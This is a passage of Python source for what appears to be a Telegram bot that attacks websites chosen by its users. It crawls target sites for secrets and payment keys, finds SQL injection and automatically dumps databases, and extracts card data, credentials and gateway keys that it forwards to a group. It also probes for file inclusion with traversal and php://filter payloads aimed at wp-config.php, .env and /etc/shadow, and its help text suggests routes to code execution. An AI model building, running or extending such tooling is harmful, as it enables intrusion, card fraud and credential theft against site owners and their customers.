        if arg_lower in ("quick", "nosqli", "nodump", "nolfi"):
            options.append(arg_lower)
        elif arg.startswith("http") or "." in arg:
            # It's a URL
            if not arg.startswith("http"):
                arg = "https://" + arg
            urls.append(arg)
    
    # Merge file URLs into the list
    for u in file_urls:
        if not u.startswith("http"):
            u = "https://" + u
        if u not in urls:
            urls.append(u)
    
    if not urls:
        await update.message.reply_text("❌ No valid URLs provided!", parse_mode="HTML")
        return
    
    opt_quick = "quick" in options
    opt_nosqli = "nosqli" in options
    opt_nodump = "nodump" in options
    opt_nolfi = "nolfi" in options
    
    # Build status message
    opts_text = []
    if opt_quick:
        opts_text.append("⚡ Quick Mode")
    else:
        opts_text.append("🔬 MAX DEPTH")
    if opt_nosqli:
        opts_text.append("⏩ No SQLi")
    if opt_nodump:
        opts_text.append("🚫 No Dump")
    if opt_nolfi:
        opts_text.append("⏩ No LFI")
    
    # If multiple URLs, show batch status
    if len(urls) > 1:
        await update.message.reply_text(
            f"📋 <b>Batch Scan: {len(urls)} URLs</b>\n"
            f"Mode: {', '.join(opts_text)}\n"
            f"Starting sequential scan...",
            parse_mode="HTML"
        )
    
    # Process each URL
    for url_index, url in enumerate(urls, 1):
        if len(urls) > 1:
            await update.message.reply_text(
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"📍 <b>URL {url_index}/{len(urls)}</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━",
                parse_mode="HTML"
            )
        
        status_msg = f"🔍 <b>Scanning:</b> <code>{url}</code>\n"
        status_msg += f"Mode: {', '.join(opts_text)}\n"
        status_msg += "Deep crawling pages + JS + endpoints + secrets..."
        
        await update.message.reply_text(status_msg, parse_mode="HTML")
        
        # Run single URL scan
        try:
            await _scan_single_url(update, p, url, opt_quick, opt_nosqli, opt_nodump, opt_nolfi, opts_text)
        except Exception as scan_err:
            logger.error(f"Scan error for {url}: {scan_err}")
            await update.message.reply_text(
                f"❌ <b>Error scanning {url}:</b>\n<code>{str(scan_err)[:200]}</code>",
                parse_mode="HTML"
            )
    
    if len(urls) > 1:
        await update.message.reply_text(
            f"✅ <b>Batch Scan Complete!</b>\n"
            f"Scanned {len(urls)} URLs",
            parse_mode="HTML"
        )


async def _scan_single_url(update, p, url, opt_quick, opt_nosqli, opt_nodump, opt_nolfi, opts_text):
    """Internal helper to scan a single URL."""
    import aiohttp
    from urllib.parse import urlparse as _urlparse
    
    parsed = _urlparse(url)
    base_url = f"{parsed.scheme}://{parsed.netloc}"
    waf_result = None
    
    timeout = aiohttp.ClientTimeout(total=60 if not opt_quick else 20)
    async with aiohttp.ClientSession(timeout=timeout, headers={
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    }) as session:
        
        # 1. WAF Detection
        if p.config.waf_detection_enabled:
            waf_info = await p.waf_detector.detect(url, session)
            waf_result = {
                "name": waf_info.waf,
                "cdn": waf_info.cdn,
                "bot_protection": waf_info.bot_protection,
                "risk": waf_info.risk_level,
                "cms": waf_info.cms,
            }
        
        # 2. Deep extract — returns secrets + platform + endpoints + sqli candidates
        scan_result = await p.secret_extractor.deep_extract_site(url, session)
        
        all_secrets = scan_result.get("secrets", [])
        platform_info = scan_result.get("platform", {})
        endpoints_info = scan_result.get("endpoints", {})
        sqli_candidates = scan_result.get("sqli_candidates", [])
        pages_scanned = scan_result.get("pages_scanned", 0)
        
        # Fetch main page HTML ONCE and reuse for crawling + JS scanning
        main_html = ""
        try:
            async with session.get(url, ssl=False, allow_redirects=True) as resp:
                main_html = await resp.text(errors="ignore")
        except Exception:
            pass
        
        # Track all scanned URLs to avoid re-scanning
        scanned_urls = {url}
        
        # 2a. ALWAYS crawl internal links (unless quick mode)
        max_pages = 10 if opt_quick else 100
        await update.message.reply_text(f"🔬 <b>Deep Crawl:</b> Scanning up to {max_pages} internal pages...", parse_mode="HTML")
        try:
            if main_html:
                from bs4 import BeautifulSoup
                soup = BeautifulSoup(main_html, "html.parser")
                
                internal_links = set()
                for a in soup.find_all("a", href=True):
                    href = a["href"]
                    if href.startswith("/") or parsed.netloc in href:
                        from urllib.parse import urljoin
                        full_url = urljoin(url, href)
                        if _urlparse(full_url).netloc == parsed.netloc:
                            internal_links.add(full_url)
                
                # Also look for links in JS onclick, data attributes, etc.
                for tag in soup.find_all(attrs={"onclick": True}):
                    onclick = tag.get("onclick", "")
                    urls_in_onclick = re.findall(r'["\']([^"\']*/[^"\']*)["\']', onclick)
                    for u in urls_in_onclick:
                        from urllib.parse import urljoin
                        full_url = urljoin(url, u)
                        if _urlparse(full_url).netloc == parsed.netloc:
                            internal_links.add(full_url)
                
                # Add hidden field + JS API endpoints from main_html as crawl targets
                for ep in endpoints_info.get("js_api_urls", []):
                    if _urlparse(ep).netloc == parsed.netloc:
                        internal_links.add(ep)
                for ep in endpoints_info.get("internal_paths", []):
                    internal_links.add(ep)
                
                deep_pages = [u for u in list(internal_links)[:max_pages] if u not in scanned_urls]
                for i, page_url in enumerate(deep_pages):
                    scanned_urls.add(page_url)
                    if i % 20 == 0 and i > 0:
                        await update.message.reply_text(f"🔬 Deep crawl: {i}/{len(deep_pages)} pages...", parse_mode="HTML")
                    try:
                        page_secrets = await p.secret_extractor.extract_from_url(page_url, session)
                        all_secrets.extend(page_secrets)
                        pages_scanned += 1
                        
                        # Get additional endpoints from each page (reuses the response text from extract_from_url)
                        async with session.get(page_url, ssl=False, allow_redirects=True) as page_resp:
                            if page_resp.status == 200:
                                page_html = await page_resp.text(errors='ignore')
                                page_endpoints = p.secret_extractor.discover_endpoints(page_html, base_url)
                                for key in page_endpoints:
                                    for ep in page_endpoints[key]:
                                        if ep not in endpoints_info.get(key, []):
                                            endpoints_info.setdefault(key, []).append(ep)
                    except Exception:
                        pass
                
                # Refresh sqli candidates with all discovered endpoints
                sqli_candidates = p.secret_extractor.get_sqli_candidates(endpoints_info, base_url)
        except Exception as e:
            logger.error(f"Deep crawl error: {e}")
        
        # 2b. ALWAYS scan JS files for secrets
        max_js = 15 if opt_quick else 50
        await update.message.reply_text(f"📜 <b>JS Scan:</b> Scanning up to {max_js} JavaScript files...", parse_mode="HTML")
        try:
            if main_html:
                # Reuse main_html — no extra fetch needed
                js_files = re.findall(r'src=["\']([^"\']+\.js[^"\']*)["\']', main_html, re.I)
                js_files = list(set(js_files))[:max_js]
                
                for js_url in js_files:
                    if js_url.startswith('//'):
                        js_url = parsed.scheme + ':' + js_url
                    elif js_url.startswith('/'):
                        js_url = base_url + js_url
                    elif not js_url.startswith('http'):
                        js_url = base_url + '/' + js_url
                    
                    if js_url in scanned_urls:
                        continue
                    scanned_urls.add(js_url)
                    
                    try:
                        js_secrets = await p.secret_extractor.extract_from_url(js_url, session)
                        all_secrets.extend(js_secrets)
                        pages_scanned += 1
                    except Exception:
                        pass
        except Exception as e:
            logger.error(f"JS scan error: {e}")
        
        # 3. Test ALL SQLi candidates and EXPLOIT if injectable (unless nosqli)
        sqli_results = []
        sqli_tested = 0
        dump_results = []
        
        if not opt_nosqli and sqli_candidates:
            max_sqli_tests = 15 if opt_quick else 50
            await update.message.reply_text(
                f"🔓 <b>SQLi Testing:</b> Testing {min(len(sqli_candidates), max_sqli_tests)} endpoints...",
                parse_mode="HTML"
            )
            for candidate in sqli_candidates[:max_sqli_tests]:
                try:
                    results = await p.sqli_scanner.scan(candidate['url'], session)
                    sqli_tested += 1
                    if results:
                        for r in results:
                            sqli_results.append({
                                "url": r.url,
                                "param": r.parameter,
                                "technique": r.technique,
                                "injection_type": r.injection_type,
                                "dbms": r.dbms or "Unknown",
                                "type": candidate['type'],
                                "column_count": r.column_count,
                                "db_version": r.db_version,
                                "current_db": r.current_db,
                                "current_user": r.current_user,
                            })
                            
                            # Track the vulnerability
                            p.vulnerable_urls.append({
                                "url": r.url,
                                "param": r.parameter,
                                "type": r.injection_type,
                                "dbms": r.dbms,
                                "time": datetime.now().isoformat(),
                            })
                            
                            # Report vuln to group
                            await p.reporter.report_sqli_vuln(
                                r.url, r.parameter, r.dbms or "Unknown",
                                r.injection_type,
                                {
                                    "db_version": r.db_version,
                                    "current_db": r.current_db,
                                    "column_count": r.column_count,
                                    "source": f"/scan {candidate['type']}",
                                }
                            )
                            
                            # EXPLOIT: Dump data if union/error-based (unless nodump)
                            should_dump = r.injection_type in ("union", "error") and not opt_nodump
                            if should_dump:
                                dump_type = r.injection_type
                                
                                await update.message.reply_text(
                                    f"💉 <b>Injectable!</b> Exploiting {dump_type} SQLi on <code>{r.parameter}</code>...\n"
                                    f"DBMS: {r.dbms or 'Unknown'} | Columns: {r.column_count}\n"
                                    f"Dumping tables & data...",
                                    parse_mode="HTML"
                                )
                                
                                try:
                                    dump = await p.dumper.targeted_dump(r, session)
                                    
                                    if dump.has_valuable_data or dump.total_rows > 0:
                                        # Save dump to disk
                                        saved = p.dumper.save_dump(dump)
                                        
                                        dump_info = {
                                            "url": r.url,
                                            "param": r.parameter,
                                            "dbms": dump.dbms,
                                            "database": dump.database,
                                            "tables": len(dump.tables),
                                            "total_rows": dump.total_rows,
                                            "cards": len(dump.card_data),
                                            "credentials": len(dump.credentials),
                                            "gateway_keys": len(dump.gateway_keys),
                                            "files": saved,
                                        }
                                        dump_results.append(dump_info)
                                        
                                        # Report full dump to group
                                        await p.reporter.report_data_dump(
                                            r.url, dump.dbms, dump.database,
                                            dump.tables,
                                            {t: len(rows) for t, rows in dump.data.items()},
                                            saved,
                                        )
                                        
                                        # Report card data specifically
                                        if dump.card_data:
                                            p.found_cards.extend(dump.card_data)
                                            await p.reporter.report_card_data(r.url, dump.card_data)
                                        
                                        # Report credentials
                                        if dump.credentials:
                                            for cred in dump.credentials:
                                                p.found_secrets.append({
                                                    "url": r.url,
                                                    "type": "db_credential",
                                                    "value": str(cred),
                                                    "source": "sqli_dump",
                                                    "time": datetime.now().isoformat(),
                                                })
                                        
                                        # Report gateway keys from dump
                                        if dump.gateway_keys:
                                            for key_entry in dump.gateway_keys:
                                                for col, val in key_entry.items():
                                                    p.found_gateways.append({
                                                        "url": r.url,
                                                        "type": f"db_{col}",
                                                        "value": val,
                                                        "source": "sqli_dump",
                                                        "time": datetime.now().isoformat(),
                                                    })
                                                    await p.reporter.report_gateway(
                                                        r.url, f"DB: {col}", val,
                                                        {"source": "SQL injection dump via /scan"}
                                                    )
                                                    # Feed to Mady Bot
                                                    if p.mady_feeder:
                                                        p.mady_feeder.feed_gateway(r.url, f"db_{col}", val)
                                        
                                        # Notify in scan chat
                                        dump_text = (
                                            f"📦 <b>Data Dump Successful!</b>\n"
                                            f"DB: {dump.database or 'N/A'} ({dump.dbms})\n"
                                            f"Tables: {len(dump.tables)} | Rows: {dump.total_rows}\n"
                                        )
                                        if dump.card_data:
                                            dump_text += f"💳 <b>Card Data: {len(dump.card_data)} entries</b>\n"
                                        if dump.credentials:
                                            dump_text += f"🔐 Credentials: {len(dump.credentials)}\n"
                                        if dump.gateway_keys:
                                            dump_text += f"🔑 Gateway Keys: {len(dump.gateway_keys)}\n"
                                        if dump.raw_dumps:
                                            dump_text += f"📄 DIOS Dumps: {len(dump.raw_dumps)}\n"
                                        
                                        await update.message.reply_text(dump_text, parse_mode="HTML")
                                    else:
                                        await update.message.reply_text(
                                            f"💉 Injection works but no high-value data found in dump.\n"
                                            f"Tables found: {len(dump.tables)}",
                                            parse_mode="HTML"
                                        )
                                        dump_results.append({
                                            "url": r.url,
                                            "param": r.parameter,
                                            "dbms": dump.dbms,
                                            "tables": len(dump.tables),
                                            "total_rows": dump.total_rows,
                                            "cards": 0, "credentials": 0, "gateway_keys": 0,
                                        })
                                
                                except Exception as dump_err:
                                    logger.error(f"Dump error for {r.url}: {dump_err}")
                                    await update.message.reply_text(
                                        f"⚠️ Injection confirmed but dump failed: {str(dump_err)[:100]}",
                                        parse_mode="HTML"
                                    )
                except Exception:
                    pass
        
        # 4. LFI Testing on parameter URLs (unless nolfi)
        lfi_results = []
        lfi_tested = 0
        
        if not opt_nolfi:
            # Get param URLs from endpoints
            param_urls = endpoints_info.get("param_urls", [])
            
            # Also check sqli candidates as they have params
            for candidate in sqli_candidates:
                if candidate.get('url') and "=" in candidate['url']:
                    if candidate['url'] not in param_urls:
                        param_urls.append(candidate['url'])
            
            if param_urls:
                max_lfi_tests = 10 if opt_quick else 25
                test_urls = param_urls[:max_lfi_tests]
                
                await update.message.reply_text(
                    f"📂 <b>LFI Testing:</b> Testing {len(test_urls)} parameter URLs...",
                    parse_mode="HTML"
                )
                
                for test_url in test_urls:
                    try:
                        result = await p.sqli_scanner.test_lfi(test_url, session)
                        lfi_tested += 1
                        
                        if result.get("vulnerable"):
                            lfi_results.append(result)
                            
                            # Report to group
                            await p.reporter.report_secret(
                                result["url"],
                                "LFI_VULNERABILITY",
                                f"Technique: {result.get('technique')} | Files: {len(result.get('files_found', []))}",
                                "critical",
                                {"sensitive_data": result.get("sensitive_data", [])}
                            )
                            
                            # Notify in scan chat
                            lfi_text = f"🔥 <b>LFI Found!</b> {test_url}\n"
                            lfi_text += f"Technique: <code>{result.get('technique')}</code>\n"
                            if result.get('files_found'):
                                lfi_text += f"Files exposed: {len(result['files_found'])}\n"
                            if result.get('sensitive_data'):
                                lfi_text += f"Sensitive: {', '.join(result['sensitive_data'][:3])}"
                            await update.message.reply_text(lfi_text, parse_mode="HTML")
                    except Exception as lfi_err:
                        logger.debug(f"LFI test error for {test_url}: {lfi_err}")
        
        # Save state after exploitation
        p._save_state()
    
    # Report gateway secrets to group — deduplicate first
    seen_secret_vals = set()
    deduped_secrets = []
    for s in all_secrets:
        if s.value not in seen_secret_vals:
            seen_secret_vals.add(s.value)
            deduped_secrets.append(s)
    all_secrets = deduped_secrets
    
    for secret in all_secrets:
        if secret.category == "gateway":
            p.found_gateways.append({
                "url": secret.url,
                "type": secret.type,
                "value": secret.value,
                "time": datetime.now().isoformat(),
            })
            await p.reporter.report_gateway(
                secret.url, secret.type, secret.value,
                {"confidence": secret.confidence}
            )
            # Feed to Mady Bot
            if p.mady_feeder:
                p.mady_feeder.feed_gateway(secret.url, secret.type, secret.value)
    
    # Build response
    text = f"━━━━━━━━━━━━━━━━━━━━\n🔍 <b>Deep Site Scan Result</b>\n━━━━━━━━━━━━━━━━━━━━\n"
    text += f"🌐 URL: <code>{_esc(url)}</code>\n"
    text += f"📄 Pages Scanned: {pages_scanned}\n"
    if opts_text:
        text += f"⚙️ Options: {', '.join(opts_text)}\n"
    text += "\n"
    
    # Platform info
    if platform_info:
        if platform_info.get('platform'):
            text += f"<b>Platform:</b> {_esc(platform_info['platform'])}\n"
        if platform_info.get('gateways'):
            text += f"<b>Gateways:</b> {_esc(', '.join(platform_info['gateways']))}\n"
        else:
            text += f"<b>Gateways:</b> ❌ None detected\n"
        if platform_info.get('form_type'):
            text += f"<b>Form Type:</b> {platform_info['form_type']}\n"
        text += f"AJAX: {'✅ Found' if platform_info.get('has_ajax') else '❌ Not found'}\n"
        text += f"Nonce: {'✅ Found' if platform_info.get('has_nonce') else '❌ Not found'}\n"
        text += f"Captcha: {'⚠️ Detected' if platform_info.get('has_captcha') else '✅ None'}\n"
        text += "\n"
    
    # WAF
    if waf_result:
        text += f"<b>Protection:</b>\n"
        if waf_result.get("name"):
            text += f"  WAF: {waf_result['name']}\n"
        if waf_result.get("cdn"):
            text += f"  CDN: {waf_result['cdn']}\n"
        if waf_result.get("bot_protection"):
            text += f"  Bot: {waf_result['bot_protection']}\n"
        if not waf_result.get("name") and not waf_result.get("cdn") and not waf_result.get("bot_protection"):
            text += "  WAF: ✅ None\n"
        text += "\n"
    
    # Secrets
    if all_secrets:
        gateway_secrets = [s for s in all_secrets if s.category == "gateway"]
        other_secrets = [s for s in all_secrets if s.category != "gateway"]
        
        if gateway_secrets:
            text += f"<b>🔑 Gateway Keys ({len(gateway_secrets)}):</b>\n"
            for s in gateway_secrets:
                text += f"  <b>{_esc(s.key_name)}</b>\n"
                text += f"  <code>{_esc(s.value)}</code>\n"
                text += f"  📍 {_esc(s.url)}\n\n"
        
        if other_secrets:
            text += f"<b>🔐 Other Secrets ({len(other_secrets)}):</b>\n"
            for s in other_secrets:
                text += f"  <b>{_esc(s.key_name)}</b>: <code>{_esc(s.value)}</code>\n"
            text += "\n"
    else:
        text += "🔐 No secrets/keys found.\n\n"
    
    # Endpoints discovered
    total_endpoints = sum(len(v) for v in endpoints_info.values() if isinstance(v, list))
    if total_endpoints > 0:
        text += f"<b>🌐 Endpoints Discovered ({total_endpoints}):</b>\n"
        
        ep_labels = {
            "ajax_endpoints": "⚡ AJAX",
            "rest_api": "🔗 REST API",
            "form_actions": "📝 Forms",
            "login_pages": "🔐 Login",
            "search_endpoints": "🔎 Search",
            "param_urls": "❓ Param URLs",
            "file_upload": "📤 File Upload",
            "admin_pages": "👤 Admin",
            "api_calls": "🌍 External API",
            "interesting_js": "📜 Config JS",
            "js_api_urls": "🔧 JS API URLs",
            "internal_paths": "📂 Internal Paths",
        }
        
        for key, label in ep_labels.items():
            eps = endpoints_info.get(key, [])
            if eps:
                text += f"  {label}: {len(eps)}\n"
                for ep in eps[:5]:  # Limit to 5 per category to avoid huge messages
                    text += f"    <code>{_esc(ep)}</code>\n"
                if len(eps) > 5:
                    text += f"    ... +{len(eps) - 5} more\n"
        
        # Hidden form fields (special — dict entries, not URLs)
        hidden = endpoints_info.get("hidden_fields", [])
        if hidden:
            text += f"  🔒 Hidden Fields: {len(hidden)}\n"
            for h in hidden[:5]:
                text += f"    <code>{_esc(h.get('name',''))}={_esc(h.get('value',''))}</code>\n"
            if len(hidden) > 5:
                text += f"    ... +{len(hidden) - 5} more\n"
        text += "\n"
    else:
        text += "🌐 No endpoints discovered.\n\n"
    
    # SQLi Results
    if opt_nosqli:
        text += f"🔓 SQLi: ⏩ Skipped (nosqli option)\n\n"
    elif sqli_results:
        text += f"<b>🔓 SQL Injection Found ({len(sqli_results)}):</b>\n"
        for r in sqli_results:
            text += f"  ⚠️ <b>{_esc(r['technique'])}</b> ({_esc(r['injection_type'])})\n"
            text += f"     Param: <code>{_esc(r['param'])}</code> | DBMS: {_esc(r['dbms'])}\n"
            if r.get('db_version'):
                text += f"     Version: {_esc(r['db_version'])}\n"
            if r.get('current_db'):
                text += f"     Database: {_esc(r['current_db'])}\n"
            if r.get('current_user'):
                text += f"     User: {_esc(r['current_user'])}\n"
            text += f"     Source: {_esc(r['type'])} | Cols: {r.get('column_count', '?')}\n"
            text += f"     <code>{_esc(r['url'])}</code>\n\n"
    elif sqli_tested > 0:
        text += f"🔓 SQLi: Tested {sqli_tested} endpoints — none injectable\n\n"
    else:
        text += f"🔓 SQLi: No testable endpoints found\n\n"
    
    # Dump Results
    if dump_results:
        text += f"<b>📦 Data Dumps ({len(dump_results)}):</b>\n"
        for d in dump_results:
            text += f"  DB: {d.get('database', '?')} ({d.get('dbms', '?')})\n"
            text += f"  Tables: {d.get('tables', 0)} | Rows: {d.get('total_rows', 0)}\n"
            if d.get('cards', 0) > 0:
                text += f"  💳 Cards: {d['cards']}\n"
            if d.get('credentials', 0) > 0:
                text += f"  🔐 Credentials: {d['credentials']}\n"
            if d.get('gateway_keys', 0) > 0:
                text += f"  🔑 Gateway Keys: {d['gateway_keys']}\n"
            text += "\n"
    
    # LFI Results
    if opt_nolfi:
        text += f"📂 LFI: ⏩ Skipped (nolfi option)\n\n"
    elif lfi_results:
        text += f"<b>📂 LFI Vulnerabilities ({len(lfi_results)}):</b>\n"
        for r in lfi_results:
            text += f"  🔥 <b>{_esc(r.get('technique', 'Unknown'))}</b>\n"
            text += f"     <code>{_esc(r.get('url', '')[:60])}...</code>\n"
            if r.get('files_found'):
                text += f"     Files exposed: {len(r['files_found'])}\n"
                for f in r['files_found'][:3]:
                    text += f"       • <code>{_esc(f.get('file', ''))}</code>\n"
            if r.get('sensitive_data'):
                text += f"     ⚠️ {_esc(', '.join(r['sensitive_data'][:2]))}\n"
            text += "\n"
    elif lfi_tested > 0:
        text += f"📂 LFI: Tested {lfi_tested} param URLs — none vulnerable\n\n"
    else:
        text += f"📂 LFI: No testable param URLs found\n\n"
    
    text += "━━━━━━━━━━━━━━━━━━━━"
    
    # Split if message too long for Telegram (HTML-safe)
    parts = _safe_send_parts(text, 4000)
    for part in parts:
        try:
            await update.message.reply_text(part, parse_mode="HTML")
        except Exception as send_err:
            # Fallback: strip HTML and send as plain text
            logger.warning(f"HTML parse error, sending plain: {send_err}")
            plain = re.sub(r'<[^>]+>', '', part)
            await update.message.reply_text(plain[:4000])


async def cmd_adminfinder(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /adminfinder <domain> — Find admin panels on target.
    
    Uses SQLi Dumper's dictionary of 100+ admin paths to find
    login pages, control panels, and admin areas.
    
    Examples:
        /adminfinder example.com
        /adminfinder https://example.com
    """
    p = get_pipeline()
    
    if not context.args:
        await update.message.reply_text(
            "<b>🔍 Admin Panel Finder</b>\n\n"
            "<b>Usage:</b> /adminfinder &lt;domain&gt;\n\n"
            "Scans for:\n"
            "  • Admin login pages\n"
            "  • Control panels (cpanel, admin, wp-admin)\n"
            "  • CMS admin areas (WordPress, Joomla, Drupal)\n"
            "  • Database managers (phpMyAdmin)\n"
            "  • 100+ common admin paths\n\n"
            "<b>Example:</b>\n"
            "  /adminfinder example.com",
            parse_mode="HTML"
        )
        return
    
    domain = context.args[0]
    if not domain.startswith("http"):
        domain = "https://" + domain
    
    # Extract base domain
    parsed = urlparse(domain)
    base_url = f"{parsed.scheme}://{parsed.netloc}"
    
    await update.message.reply_text(
        f"🔍 <b>Scanning {parsed.netloc} for admin panels...</b>\n\n"
        f"Checking 100+ paths (SQLi Dumper dict)\n"
        f"This may take 30-60 seconds...",
        parse_mode="HTML"
    )
    
    try:
        import aiohttp
        
        async with aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=60),
            headers={"User-Agent": p.sqli_scanner.user_agent}
        ) as session:
            found = await p.sqli_scanner.find_admin_panels(base_url, session, max_concurrent=30)
        
        if found:
            text = f"✅ <b>Found {len(found)} admin panel(s) on {parsed.netloc}</b>\n\n"
            for i, panel_url in enumerate(found[:20], 1):  # Show max 20
                text += f"{i}. <code>{panel_url}</code>\n"
            
            if len(found) > 20:
                text += f"\n... and {len(found) - 20} more"
            
            text += "\n\n💡 <b>Next steps:</b>\n"
            text += "  • Try default credentials\n"
            text += "  • Check for SQLi in login form\n"
            text += "  • Look for password reset vulns"
        else:
            text = f"❌ <b>No admin panels found on {parsed.netloc}</b>\n\n"
            text += "The site may:\n"
            text += "  • Use custom admin paths\n"
            text += "  • Have admin behind CDN/firewall\n"
            text += "  • Require authentication for paths"
        
        await update.message.reply_text(text, parse_mode="HTML")
        
    except Exception as e:
        logger.error(f"Admin finder error: {e}")
        await update.message.reply_text(
            f"❌ <b>Error scanning {parsed.netloc}:</b>\n<code>{e}</code>",
            parse_mode="HTML"
        )


async def cmd_lfi(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /lfi <url> — Local File Inclusion scanner.
    
    Tests for LFI vulnerabilities using 206 sensitive file paths from SQLi Dumper.
    Uses multiple techniques: path traversal, null byte, PHP wrappers, etc.
    
    Examples:
        /lfi https://example.com/page.php?file=index
        /lfi https://example.com/download.php?path=document.pdf
    """
    p = get_pipeline()
    
    if not context.args:
        await update.message.reply_text(
            "<b>📂 LFI Scanner (Local File Inclusion)</b>\n\n"
            "<b>Usage:</b> /lfi &lt;url&gt;\n\n"
            "Tests for LFI using 206 sensitive file paths:\n"
            "  • System files (/etc/passwd, /etc/shadow)\n"
            "  • Web configs (wp-config.php, .env)\n"
            "  • Server logs (Apache, nginx, FTP)\n"
            "  • PHP configs (php.ini, .htaccess)\n"
            "  • Database configs (my.cnf)\n\n"
            "<b>Techniques:</b>\n"
            "  • Direct path (../../../etc/passwd)\n"
            "  • Null byte (%00 bypass)\n"
            "  • PHP wrappers (php://filter)\n"
            "  • Double encoding (%252e%252e)\n"
            "  • UTF-8 overlong (..%c0%af)\n\n"
            "<b>Example:</b>\n"
            "  /lfi https://site.com/read.php?file=test",
            parse_mode="HTML"
        )
        return
    
    url = context.args[0]
    if not url.startswith("http"):
        url = "https://" + url
    
    parsed = urlparse(url)
    
    # Check if URL has parameters
    if "=" not in url:
        await update.message.reply_text(
            "⚠️ <b>URL needs a parameter to test!</b>\n\n"
            "LFI typically targets parameters like:\n"
            "  • ?file=\n"
            "  • ?page=\n"
            "  • ?path=\n"
            "  • ?template=\n"
            "  • ?include=\n\n"
            f"<b>Try:</b> <code>/lfi {url}?file=test</code>",
            parse_mode="HTML"
        )
        return
    
    await update.message.reply_text(
        f"📂 <b>Scanning {parsed.netloc} for LFI...</b>\n\n"
        f"Testing 17 techniques × 206 file paths\n"
        f"This may take 1-2 minutes...",
        parse_mode="HTML"
    )
    
    try:
        import aiohttp
        
        async with aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=120),
            headers={"User-Agent": p.sqli_scanner.user_agent}
        ) as session:
            result = await p.sqli_scanner.test_lfi(url, session)
        
        if result["vulnerable"]:
            text = f"🔥 <b>LFI VULNERABLE: {parsed.netloc}</b>\n\n"
            text += f"<b>Technique:</b> <code>{result['technique']}</code>\n\n"
            
            if result["files_found"]:
                text += f"<b>📁 Files Exposed ({len(result['files_found'])}):</b>\n"
                for i, f in enumerate(result["files_found"][:10], 1):
                    text += f"\n{i}. <code>{f['file']}</code>\n"
                    if f.get("content_preview"):
                        preview = f["content_preview"][:100].replace("<", "&lt;").replace(">", "&gt;")
                        text += f"   <i>{preview}...</i>\n"
                
                if len(result["files_found"]) > 10:
                    text += f"\n... and {len(result['files_found']) - 10} more files"
            
            if result["sensitive_data"]:
                text += f"\n\n<b>⚠️ Sensitive Data Found:</b>\n"
                for item in result["sensitive_data"][:5]:
                    text += f"  • {item}\n"
            
            text += "\n\n<b>💀 Exploitation:</b>\n"
            text += "  • Read source code (php://filter)\n"
            text += "  • Log poisoning → RCE\n"
            text += "  • /proc/self/environ injection\n"
            text += "  • Session file inclusion"
        else:
            text = f"✅ <b>No LFI found on {parsed.netloc}</b>\n\n"
            text += "Tested:\n"
            text += "  • 17 traversal techniques\n"
            text += "  • 206 sensitive file paths\n"
            text += "  • PHP wrapper attacks\n\n"
            text += "Site may have:\n"
            text += "  • Input validation/filtering\n"
            text += "  • open_basedir restriction\n"
            text += "  • WAF protection"
        
        await update.message.reply_text(text, parse_mode="HTML")
        
    except Exception as e:
        logger.error(f"LFI scan error: {e}")
        await update.message.reply_text(
            f"❌ <b>Error scanning {parsed.netloc}:</b>\n<code>{e}</code>",
            parse_mode="HTML"
        )


async def cmd_lfiextract(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /lfiextract <url> — Extract and parse sensitive files via LFI.
    
    Exploits LFI to extract wp-config.php, .env, /etc/passwd and parses
    database credentials, API keys, and system users.
    
    Examples:
        /lfiextract https://example.com/page.php?file=test
        /lfiextract https://vuln.com/download.php?path=doc.pdf
    """
    p = get_pipeline()
    
    if not context.args:
        await update.message.reply_text(
            "<b>🔓 LFI Extractor</b>\n\n"
            "<b>Usage:</b> /lfiextract &lt;vulnerable_url&gt;\n\n"
            "Exploits LFI to extract and parse:\n"
            "  • <b>wp-config.php</b> → DB credentials\n"
            "  • <b>.env</b> → API keys, secrets\n"
            "  • <b>/etc/passwd</b> → System users\n"
            "  • <b>/etc/shadow</b> → Password hashes\n\n"
            "<b>Uses techniques:</b>\n"
            "  • php://filter/convert.base64-encode\n"
            "  • Path traversal (../../../)\n"
            "  • Null byte injection\n\n"
            "<b>Example:</b>\n"
            "  /lfiextract https://site.com/page.php?file=test",
            parse_mode="HTML"
        )
        return
    
    url = context.args[0]
    if not url.startswith("http"):
        url = "https://" + url
    
    parsed = urlparse(url)
    
    if "=" not in url:
        await update.message.reply_text(
            "⚠️ <b>URL needs a parameter!</b>\n"
            "Use the vulnerable URL from /lfi or /scan results.",
            parse_mode="HTML"
        )
        return
    
    await update.message.reply_text(
        f"🔓 <b>Extracting sensitive files from {parsed.netloc}...</b>\n\n"
        "Attempting:\n"
        "  • wp-config.php (DB creds)\n"
        "  • .env (secrets)\n"
        "  • /etc/passwd (users)",
        parse_mode="HTML"
    )
    
    import aiohttp
    import base64
    from urllib.parse import urlparse as _urlparse, parse_qs, urlencode, urlunparse
    
    # Parse the URL to get the vulnerable parameter
    parsed_url = _urlparse(url)
    params = parse_qs(parsed_url.query, keep_blank_values=True)
    
    if not params:
        await update.message.reply_text("❌ No parameters found in URL", parse_mode="HTML")
        return
    
    # Get the first parameter (most likely the vulnerable one)
    vuln_param = list(params.keys())[0]
    
    # Files to extract with their traversal paths
    target_files = [
        # WordPress config - multiple traversal depths
        ("wp-config.php", "php://filter/convert.base64-encode/resource=wp-config.php"),
        ("wp-config.php", "php://filter/convert.base64-encode/resource=../wp-config.php"),
        ("wp-config.php", "php://filter/convert.base64-encode/resource=../../wp-config.php"),
        ("wp-config.php", "../../../wp-config.php"),
        ("wp-config.php", "../../../../wp-config.php"),
        ("wp-config.php", "../../../../../wp-config.php"),
        # .env files
        (".env", "php://filter/convert.base64-encode/resource=.env"),
        (".env", "php://filter/convert.base64-encode/resource=../.env"),
        (".env", "../../../.env"),
        (".env", "../../../../.env"),
        # System files
        ("/etc/passwd", "../../../../../etc/passwd"),
        ("/etc/passwd", "../../../../../../etc/passwd"),
        ("/etc/passwd", "../../../../../../../etc/passwd"),
        ("/etc/shadow", "../../../../../etc/shadow"),
        ("/etc/shadow", "../../../../../../etc/shadow"),
        # MySQL config
        ("/etc/mysql/my.cnf", "../../../../../etc/mysql/my.cnf"),
        # Apache/nginx configs
